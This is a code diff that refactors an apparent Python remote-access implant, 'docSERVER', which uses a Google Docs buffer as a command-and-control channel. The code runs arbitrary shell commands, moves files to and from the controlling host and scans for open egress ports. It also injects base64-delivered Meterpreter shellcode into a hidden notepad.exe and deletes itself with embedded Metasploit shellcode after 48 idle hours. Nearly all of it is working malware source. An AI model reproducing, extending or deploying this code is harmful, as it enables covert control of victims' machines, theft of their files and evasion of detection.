@@ -16,17 +16,14 @@ import threading
 import Queue
 from imp import is_frozen
 
-
-
-### GLOBALS ###
-
-# Idle Hours Before Self Removal
-TIMEOUT = 48
+VERSION = 1.1
+TIMEOUT = 48 # Idle Hours Before Self Removal
 SECPERHOUR = 3600
-
-# Debug Logging Object and Handle
-# Will log to file if using exe
+BLOCKSIZE=2**10
 DEBUG = False
+
+local_os = platform.system()
+egress_port = [] # Shared global for egress_bust threads
 
 logger = logging.getLogger('__docSERVER__')
 if not DEBUG:
@@ -42,37 +39,29 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 ch.setFormatter(formatter)
 logger.addHandler(ch)
 
-# OS Detection
-OS = platform.system()
-
-# Shared global for egress_bust threads
-egress_port = []
-
-# Blocksize Used in File Transfer
-BLOCKSIZE=2**10
 
 
-### Freeze / EXE Detection Bool ###
-# From www.py2exe.org/index.cgi/HowToDetermineIfRunningFromExe
-# ThomasHeller posted this tip to the py2exe mailing list
 def main_is_frozen():
+    """Return freeze detection Bool
+    
+    From www.py2exe.org/index.cgi/HowToDetermineIfRunningFromExe
+    ThomasHeller posted to the py2exe mailing list
+    """
     return (hasattr(sys, "frozen") or # new py2exe
             hasattr(sys, "importers") # old py2exe
             or is_frozen("__main__")) # tools/freeze
-    
+   
     
 ### Delay Backoff and Removal Timers ###
-
-# Check if C&C has time out 
-# True initiates clean_up() in main()
 def timed_out(last_cmd_time):
+    """Check for C2 timed out, True triggers clean_up() in main()"""
     if int(time() - last_cmd_time) >= (TIMEOUT * SECPERHOUR):
         return True
     return False
-                    
-                    
-#command polling backoff interval
+
+                  
 def get_delay(delay_counter):
+    """Command polling back-off interval"""
     delay = 0.5
     if delay_counter > 0 and delay_counter <= 5:
         delay = 1
@@ -96,12 +85,15 @@ def get_delay(delay_counter):
 
 
 ### Command Parsing and Exec ###
-
-# Exec Command via Correct OS method
-# Return stdOut and/or stdErr
 def process_cmd(doc_buffer, command_str):
-    static_cmds = ["!sysinfo", "!sync", "!shutdown", "!cleanup"]
-    #Static builtins
+    """Parse and hand off command to method
+    
+    Exec builtin static commands
+    Exec builting parsed commands
+    Or pass non-builtin to system specific shell
+    Return stdOut and/or stdErr to client via buffer
+    """
+    static_cmds = ["!sysinfo", "!sync", "!shutdown", "!cleanup"] # Static builtins
     if command_str in static_cmds:
         if command_str == "!sysinfo":
             return (syscheck())
@@ -112,8 +104,8 @@ def process_cmd(doc_buffer, command_str):
             os._exit(0) # aggressive exit
         elif command_str == "!cleanup":
             return clean_up()
-    #parsed commands
-    elif command_str.startswith('!download'):
+    
+    elif command_str.startswith('!download'): # Parsed builtins
         return download(doc_buffer, command_str)  
     elif command_str.startswith('!upload'):
         return upload(doc_buffer, command_str) 
@@ -123,22 +115,25 @@ def process_cmd(doc_buffer, command_str):
         return meter_up(command_str);
     elif command_str.startswith('!forward'):
         return forward_port(doc_buffer, command_str)
-    #os specific shell exec         
-    else:
+         
+    else: # OS specific shell exec   
         try:  
-            if OS == 'Linux':
+            if local_os == 'Linux':
                 return nix_exec_cmd(command_str)      
-            elif OS == 'Windows':
+            elif local_os == 'Windows':
                 return win_exec_cmd(command_str)
-            elif OS == 'OSX':
+            elif local_os == 'OSX':
                 return osx_exec_cmd(command_str)            
         except:
             logger.debug('process_cmd(): Execution error for command: \"' + command_str +'\"')
-    
 
-# WINDOWS: exec via cmd subprocess
-# shell=True allows for redirection and pipes
+
 def win_exec_cmd(commands_in):
+    """WINDOWS shell exec 
+    
+    Execute raw shell command via cmd subprocess
+    shell=True allows for redirection and pipes
+    """
     #cmdLine = ['cmd', '/q' '/k'] + commands_in.split()
     try:
         process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -152,11 +147,14 @@ def win_exec_cmd(commands_in):
     except OSError:
         return "\nERROR: OSError"
   
-  
-# LINUX: exec via env-shell subprocess 
-# shell=True, assumes trusted input
-# allows for pipes and redirection. IO: sto, ste
+
 def nix_exec_cmd(commands_in):
+    """LINUX shell exec 
+    
+    Execute raw command via env-shell subprocess 
+    shell=True, assumes trusted input
+    allows for pipes and redirection. IO: sto, ste
+    """
     try:
         process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         output = process.communicate()    
@@ -166,12 +164,16 @@ def nix_exec_cmd(commands_in):
             return output[0] + output[1]
         else:
             return output[1]    
-    except OSError:
-        return "\nERROR: OSError"
+    except OSError as e:
+        return "\nERROR: OSError: %s" % e
 
 
-# OSX:  exec via -    #TODO: Test on OSX
 def osx_exec_cmd(commands_in):
+    """OSX shell exec
+    
+    Not implemented / tested
+    TODO: Test on OSX
+    """
     try:
         process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         output = process.communicate()    
@@ -186,9 +188,8 @@ def osx_exec_cmd(commands_in):
 
 
 ### File Transfer ###     
-
-# Receives file pushed from controlling client
 def upload(doc_buffer, file_str):
+    """Receives file pushed from controlling client"""
     up_cmd_list = file_str.split('.')
     write_file = up_cmd_list[1].decode('base64','strict')
     write_file = os.path.expandvars(write_file)
@@ -245,8 +246,8 @@ def upload(doc_buffer, file_str):
         return "File Access Error"
 
 
-# Feed requested file to controlling host
 def download(doc_buffer, file_str):
+    """Push requested file to controlling host"""
     local_path = file_str.split(".")[1].decode('base64','strict').strip('\n')
     local_path = os.path.expandvars(local_path)
     if os.path.exists(local_path):
@@ -281,10 +282,8 @@ def download(doc_buffer, file_str):
 
 
 ### Shell Upgrades ###
-
-
-# worker thread obj for egress port check
 class scannerThread(threading.Thread):
+    """Worker thread class for egress port check"""
     def __init__(self, port_check_queue, egress_ip):
         threading.Thread.__init__(self)
         self.port_queue = port_check_queue
@@ -311,10 +310,14 @@ class scannerThread(threading.Thread):
                 if sock:
                     sock.close()
 
-
-# Expands Portlist Launches threads
-# returns first open port
 def egress_bust(doc_buffer, cmd_str):
+    """Find open egress port to external IP4 address
+    
+    Expand List  of ports
+    Create queue containing ports to check
+    Launches worker threads
+    return open port assigned to egress_port List in parsible string
+    """
     global egress_port
     egress_port = [] #clear last check
     cmd_list = cmd_str.split("|")
@@ -322,7 +325,7 @@ def egress_bust(doc_buffer, cmd_str):
     egress_ip = cmd_list[2]  
     thread_count = int(cmd_list[3])
     
-    if "-" in cmd_list[1]:#expand and shuffle
+    if "-" in cmd_list[1]: # expand and shuffle
         try:
             min_port, max_port = cmd_list[1].split("-")
         except:
@@ -333,20 +336,17 @@ def egress_bust(doc_buffer, cmd_str):
         port_list = cmd_list[1].split(",")    
     doc_buffer.send_data("<egress>.<started>.<%s>" % len(port_list))
     
-    try:
-        # create port job queque
+    try: # create port job queque
         port_check_queue = Queue.Queue()
         for port in port_list:
             port_check_queue.put(int(port))          
-        # create worker threads and list handle
         threads = []
-        for thread_obj in range(1, thread_count +  1) :
+        for thread_obj in range(1, thread_count +  1) : # create worker threads and list handle
             worker = scannerThread(port_check_queue, egress_ip) 
             worker.setDaemon(True)
             worker.start()
-            threads.append(worker)
-        # wait for all threads to return
-        for worker in threads :
+            threads.append(worker) 
+        for worker in threads : # wait for all threads to return
             worker.join()
         if len(egress_port) > 0:
             return "<egress>.<open>.<%s>" % egress_port[0] 
@@ -355,20 +355,21 @@ def egress_bust(doc_buffer, cmd_str):
     except:
         return "<egress>.<failed>"
 
-        
-    
 
-# Injects shellcode via a remote thread into windowless process in a new process group
-# Takes in shellcode as string, converts to bytearray
-# injection code modeled modeled after work by Debasish Mandal @ http://www.debasish.in
 def inject_shellcode(shellcode):
+    """Inject shellcode
+    
+    Uses remote thread to inject provided shellcode 
+    into windowless process in new process group.
+    injection code modeled modeled after work by Debasish Mandal @ http://www.debasish.in
+    """
     shellcode = bytearray(shellcode)   
     c_buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     PROCESS_ALL_ACCESS = (0x000F0000L|0x00100000L|0xFFF)
  
     try:
         startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW # Start remote process windowless
         process = subprocess.Popen(['notepad.exe'], startupinfo=startupinfo, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)        
         pid = process.pid
         logger.debug("Got an process ID of " + str(pid))
@@ -390,49 +391,53 @@ def inject_shellcode(shellcode):
     except Exception:
         return "Injection Failed"
     
-    
-# meterpreter shellcode injector stub
+
 def meter_up(command_string):
+    """meterpreter shellcode decoder stub"""
     return inject_shellcode( command_string.split('.')[1].decode("base64", "strict") )
 
 
-# Forward TCP Socket over tunnel
-# Not available in public release
 def forward_port(doc_buffer, command_string):
+    """Forward TCP Socket inside tunnel, unavailable in public release"""
     return "Function not available"
 
 
 ### Management Settings and Cleanup ###
-
-# Kills docSERVER and removes from disk
-# Using remote thread injection
-#TODO: Test on 64x 
-#TODO: Create Posix double fork clean up as well
-#TODO: May want to obfuscate shellcode in this method
 def clean_up():
+    """Kills server and removes from disk
+    
+    Axquires pid, state(PE || script) and path
+    set up cmd to kill PID and remove from disk
+    Uses remote thread injection to exec cmd, bypassing lock on running file 
+    
+    TODO: Test on 64x 
+    TODO: Create Posix double fork clean up
+    TODO: May want to obfuscate shellcode in this method
+    TOOO: Overwrite file before del
+    """
     parent_pid = str(os.getpid())
     if main_is_frozen():
         parent_path = sys.executable
     else:
         parent_path = os.path.abspath(__file__)
-    parent_path = '"' + parent_path + '"' #handle paths with spaces, as ^ escape wont
+    parent_path = '"' + parent_path + '"' #handle paths with spaces, ^ escape wont
 
     logger.debug("Got ParentPath of " + parent_path )   
     logger.debug("Got ParentPid of " + parent_pid ) 
     
-    #WORKING ORIGINAL
     cmd_string = 'cmd /c taskkill /F /PID > nul ' + parent_pid + ' && ping 1.1.1.1 -n 1 -w 500 > nul & del /F /Q ' + parent_path
 
-    # Windows Exec Shellcode Sourced from the Metasploit Framework 
-    # http://www.rapid7.com/db/modules/payload/windows/exec
-    # Authors - vlad902 <vlad902 [at] gmail.com>, sf <stephen_fewer [at] harmonysecurity.com>
-    # 
-    # I have Modified a "\x6a\x01" push 01 to "\x6a\x00" push 00 to unset uCmdShow
-    # UINT WINAPI WinExec(
-    #                      _In_  LPCSTR lpCmdLine,
-    #                      _In_  UINT uCmdShow <-- changed value to 0 
-    #                     );
-
+    """Windows Exec Shellcode Sourced from the Metasploit Framework 
+    
+    http://www.rapid7.com/db/modules/payload/windows/exec
+    Authors - vlad902 <vlad902 [at] gmail.com>, sf <stephen_fewer [at] harmonysecurity.com>
+ 
+    I have modified "\x6a\x01" push 01 to "\x6a\x00" push 00 to unset uCmdShow
+    UINT WINAPI WinExec(
+                         _In_  LPCSTR lpCmdLine,
+                         _In_  UINT uCmdShow <-- changed value to 0 
+                        );
+    """
     shell_code = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
     "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
     "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + \
@@ -448,39 +453,37 @@ def clean_up():
     "\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" + \
     "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" + cmd_string + "\x00"   
     inject_shellcode(shell_code)
-    
 
-# Return Formated System Information
+
 def syscheck():
+    """Return List of formated System Information"""
     sysinfo = []
-    sysinfo.append("OS      : " + OS)
+    sysinfo.append("local_os      : " + local_os)
     sysinfo.append("FAMILY  : " + os.name)
     sysinfo.append("RELEASE : " + platform.release())
     sysinfo.append("PLAT    : " + platform.platform())
     sysinfo.append("ARCH    : " + platform.machine())
     sysinfo.append("HOST    : " + platform.node())
     sysinfo.append("UNAME   : " + getuser())
-    if OS == "Windows" :
+    if local_os == "Windows" :
         sysinfo.append("UID     : NULL")
-    elif OS == "Linux" : 
+    elif local_os == "Linux" : 
         sysinfo.append("UID     : " + str(os.geteuid()))
     sysinfo.append("PID     : " + str(os.getpid()))
     return str(sysinfo)
 
  
-# Main Method
 def main():
     delay_counter = 0
     last_cmd_time = time()
 
-    try:    
-        #Instantiate bufferSheet object
-        doc_buffer = gdocServerBuffer()
+    try:
+        doc_buffer = gdocServerBuffer() # Instantiate buffer object
         doc_buffer.buffer_init("client", "<NULL>")
 
-        while not timed_out(last_cmd_time):
+        while not timed_out(last_cmd_time): # process commands until timeout time
             client_data = doc_buffer.read_data()
-            logger.debug("Got Command: " + client_data) # TODO: DEBUG REMOVE
+            logger.debug("DEBUG - Got Command: " + client_data)
             if not client_data.startswith("ERROR: read timed out."):               
                 command_output = process_cmd(doc_buffer, client_data)        
                 doc_buffer.send_data(command_output)
@@ -490,7 +493,7 @@ def main():
             delay_counter += 1
             logger.debug('Delay counter: ' + str(delay_counter) + ' slept for %s seconds' % get_delay(delay_counter))
         
-        logger.debug('DEBUG: clean_up() on timeOut() Trigger')
+        logger.debug('DEBUG - clean_up() on timeOut() Trigger')
         if not DEBUG:
             clean_up()
             sleep(10)
